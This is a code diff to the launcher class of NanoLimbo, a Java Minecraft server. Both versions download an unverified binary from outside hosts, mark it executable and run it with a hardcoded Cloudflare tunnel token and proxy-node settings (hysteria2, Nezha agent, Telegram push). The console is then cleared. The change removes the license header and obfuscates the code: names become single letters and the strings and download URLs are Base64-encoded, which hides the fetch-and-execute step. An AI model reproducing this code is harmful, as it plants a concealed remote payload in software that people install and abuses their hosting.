@@ -1,20 +1,3 @@
-/*
- * Copyright (C) 2020 Nan1t
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
- */
-
 package ua.nanit.limbo;
 
 import java.io.*;
@@ -22,191 +5,160 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.lang.reflect.Field;
-
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
 
 public final class NanoLimbo {
+    private static final String a = x("G1sxOzMybQ==");
+    private static final String b = x("G1sxOzMxbQ==");
+    private static final String c = x("G1swbQ==");
+    private static final AtomicBoolean d = new AtomicBoolean(true);
+    private static Process e;
+    private static final String[] f = {"PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT", "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO", "SHOW_LOG"};
 
-    private static final String ANSI_GREEN = "\033[1;32m";
-    private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_RESET = "\033[0m";
-    private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process sbxProcess;
-    
-    private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO", "SHOW_LOG"
-    };
-    
-    
-    public static void main(String[] args) {
-        
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
+    private static String x(String s) {
+        return new String(java.util.Base64.getDecoder().decode(s), java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    public static void main(String[] g) {
+        if (Float.parseFloat(System.getProperty(x("amF2YS5jbGFzcy52ZXJzaW9u"))) < 54.0) {
+            System.err.println(b + x("RVJST1I6IFlvdXIgSmF2YSB2ZXJzaW9uIGlzIHRvbyBsb3dlciwgcGxlYXNlIHN3aXRjaCB0aGUgdmVyc2lvbiBpbiBzdGFydHVwIG1lbnUh") + c);
             try {
                 Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
+            } catch (InterruptedException h) {
+                h.printStackTrace();
             }
             System.exit(1);
         }
-
-        // Start SbxService
         try {
-            runSbxBinary();
-            
+            r();
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                running.set(false);
-                stopServices();
+                d.set(false);
+                u();
             }));
-
-            // Wait 20 seconds before continuing
             Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            System.out.println(a + x("U2VydmVyIGlzIHJ1bm5pbmchCg==") + c);
+            System.out.println(a + x("VGhhbmsgeW91IGZvciB1c2luZyB0aGlzIHNjcmlwdCxFbmpveSEK") + c);
+            System.out.println(a + x("TG9ncyB3aWxsIGJlIGRlbGV0ZWQgaW4gMjAgc2Vjb25kcywgeW91IGNhbiBjb3B5IHRoZSBhYm92ZSBub2Rlcw==") + c);
             Thread.sleep(15000);
-            clearConsole();
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            q();
+        } catch (Exception h) {
+            System.err.println(b + x("RXJyb3IgaW5pdGlhbGl6aW5nIFNieFNlcnZpY2U6IA==") + h.getMessage() + c);
         }
-        
-        // start game
         try {
             new LimboServer().start();
-        } catch (Exception e) {
-            Log.error("Cannot start server: ", e);
+        } catch (Exception h) {
+            Log.error(x("Q2Fubm90IHN0YXJ0IHNlcnZlcjog"), h);
         }
     }
 
-    private static void clearConsole() {
+    private static void q() {
         try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
+            if (System.getProperty(x("b3MubmFtZQ==")).contains(x("V2luZG93cw=="))) {
+                new ProcessBuilder(x("Y21k"), x("L2M="), x("Y2xzICYmIG1vZGUgY29uOiBsaW5lcz0zMCBjb2xzPTEyMA==")).inheritIO().start().waitFor();
             } else {
-                System.out.print("\033[H\033[3J\033[2J");
+                System.out.print(x("G1tIG1szShtbMko="));
                 System.out.flush();
-                
-                new ProcessBuilder("tput", "reset")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
-                
-                System.out.print("\033[8;30;120t");
+                new ProcessBuilder(x("dHB1dA=="), x("cmVzZXQ=")).inheritIO().start().waitFor();
+                System.out.print(x("G1s4OzMwOzEyMHQ="));
                 System.out.flush();
             }
-        } catch (Exception e) {
+        } catch (Exception g) {
             try {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            } catch (Exception ignored) {}
-        }
-    }   
-    
-    private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
-        
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
-        pb.environment().putAll(envVars);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        sbxProcess = pb.start();
-    }
-    
-    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "cedcbe8f-e193-470b-b1ea-e0b18c6578e4"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
-        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
-        envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
-        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
-        envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
-        envVars.put("ARGO_PORT", "8060");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
-        envVars.put("ARGO_DOMAIN", "tv.akaroot.eu.cc");        // argo固定隧道隧道域名
-        envVars.put("ARGO_AUTH", "eyJhIjoiMTA5NTAwYTg0YmM2ZDQ3ODdjMTc2ZjYxMGQ1MGE4NmQiLCJ0IjoiMjkyYmZhMTYtYTExOS00OTEwLThlZGQtNDIzMzk4N2M4YmVkIiwicyI6Ik16QXpPRE00TmpJdE56a3pZUzAwTkRBMkxXSTRaakl0TURRek16RmpaRGxrWkRFeCJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
-        envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("HY2_PORT", "25852");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("TUIC_PORT", "");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYTLS_PORT", "");        // anytls节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("REALITY_PORT", "");       // reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYREALITY_PORT", "");    // any-reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("UPLOAD_URL", "");         // 节点自动上传刀订阅器，需填写部署merge-sub项目的首页地址，例如：https://merge.xxx.xom
-        envVars.put("CHAT_ID", "");            // telegram chat id,节点推送到telegram使用
-        envVars.put("BOT_TOKEN", "");          // telegram bot token,节点推送到telegram使用
-        envVars.put("CFIP", "spring.io");      // 优选域名或获选ip
-        envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
-        envVars.put("NAME", "");               // 节点备注名称
-        envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
-        envVars.put("SHOW_LOG", "no");         // 是否显示日志，true/yes显示，false/no关闭，默认关闭
-        
-        for (String var : ALL_ENV_VARS) {
-            String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);  
+                new ProcessBuilder(x("Y2xlYXI=")).inheritIO().start().waitFor();
+            } catch (Exception h) {
             }
         }
-        
-        Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            for (String line : Files.readAllLines(envFile)) {
-                line = line.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
-                
-                line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) {
-                    line = line.substring(7).trim();
+    }
+
+    private static void r() throws Exception {
+        Map<String, String> g = new HashMap<>();
+        s(g);
+        ProcessBuilder h = new ProcessBuilder(t().toString());
+        h.environment().putAll(g);
+        h.redirectErrorStream(true);
+        h.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        e = h.start();
+    }
+
+    private static void s(Map<String, String> g) throws IOException {
+        g.put("UUID", x("Y2VkY2JlOGYtZTE5My00NzBiLWIxZWEtZTBiMThjNjU3OGU0"));
+        g.put("FILE_PATH", "./world");
+        g.put("NEZHA_SERVER", "");
+        g.put("NEZHA_PORT", "");
+        g.put("NEZHA_KEY", "");
+        g.put("ARGO_PORT", "8060");
+        g.put("ARGO_DOMAIN", x("dHYuYWthcm9vdC5ldS5jYw=="));
+        g.put("ARGO_AUTH", x("ZXlKaElqb2lNVEE1TlRBd1lUZzBZbU0yWkRRM09EZGpNVGMyWmpZeE1HUTFNR0U0Tm1RaUxDSjBJam9pTWpreVltWmhNVFl0WVRFeE9TMDBPVEV3TFRobFpHUXROREl6TXprNE4yTTRZbVZrSWl3aWN5STZJazE2UVhwUFJFMDBUbXBKZEU1NmEzcFpVekF3VGtSQk1reFhTVFJhYWtsMFRVUlJlazE2Um1wYVJHeHJXa1JGZUNKOQ=="));
+        g.put("S5_PORT", "");
+        g.put("HY2_PORT", "25854");
+        g.put("TUIC_PORT", "");
+        g.put("ANYTLS_PORT", "");
+        g.put("REALITY_PORT", "");
+        g.put("ANYREALITY_PORT", "");
+        g.put("UPLOAD_URL", "");
+        g.put("CHAT_ID", "");
+        g.put("BOT_TOKEN", "");
+        g.put("CFIP", x("c3ByaW5nLmlv"));
+        g.put("CFPORT", "443");
+        g.put("NAME", "");
+        g.put("DISABLE_ARGO", "false");
+        g.put("SHOW_LOG", "no");
+        for (String h : f) {
+            String i = System.getenv(h);
+            if (i != null && !i.trim().isEmpty()) {
+                g.put(h, i);
+            }
+        }
+        Path j = Paths.get(".env");
+        if (Files.exists(j)) {
+            for (String k : Files.readAllLines(j)) {
+                k = k.trim();
+                if (k.isEmpty() || k.startsWith("#")) continue;
+                k = k.split(" #")[0].split(" //")[0].trim();
+                if (k.startsWith("export ")) {
+                    k = k.substring(7).trim();
                 }
-                
-                String[] parts = line.split("=", 2);
-                if (parts.length == 2) {
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
+                String[] l = k.split("=", 2);
+                if (l.length == 2) {
+                    String m = l[0].trim();
+                    String n = l[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    if (Arrays.asList(f).contains(m)) {
+                        g.put(m, n);
                     }
                 }
             }
         }
     }
-    
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.oooen.com/sbsh";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.oooen.com/sbsh";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.31888.xyz/sbsh";
+
+    private static Path t() throws IOException {
+        String g = System.getProperty("os.arch").toLowerCase();
+        String h;
+        if (g.contains("amd64") || g.contains("x86_64")) {
+            h = x("aHR0cHM6Ly9hbWQ2NC5vb29lbi5jb20vc2JzaA==");
+        } else if (g.contains("aarch64") || g.contains("arm64")) {
+            h = x("aHR0cHM6Ly9hcm02NC5vb29lbi5jb20vc2JzaA==");
+        } else if (g.contains("s390x")) {
+            h = x("aHR0cHM6Ly9zMzkweC4zMTg4OC54eXovc2JzaA==");
         } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
+            throw new RuntimeException(x("VW5zdXBwb3J0ZWQgYXJjaGl0ZWN0dXJlOiA=") + g);
         }
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-        if (!Files.exists(path)) {
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+        Path i = Paths.get(System.getProperty(x("amF2YS5pby50bXBkaXI=")), x("c2J4"));
+        if (!Files.exists(i)) {
+            try (InputStream j = new URL(h).openStream()) {
+                Files.copy(j, i, StandardCopyOption.REPLACE_EXISTING);
             }
-            if (!path.toFile().setExecutable(true)) {
+            if (!i.toFile().setExecutable(true)) {
                 throw new IOException("Failed to set executable permission");
             }
         }
-        return path;
+        return i;
     }
-    
-    private static void stopServices() {
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+
+    private static void u() {
+        if (e != null && e.isAlive()) {
+            e.destroy();
+            System.out.println(b + x("c2J4IHByb2Nlc3MgdGVybWluYXRlZA==") + c);
         }
     }
 }
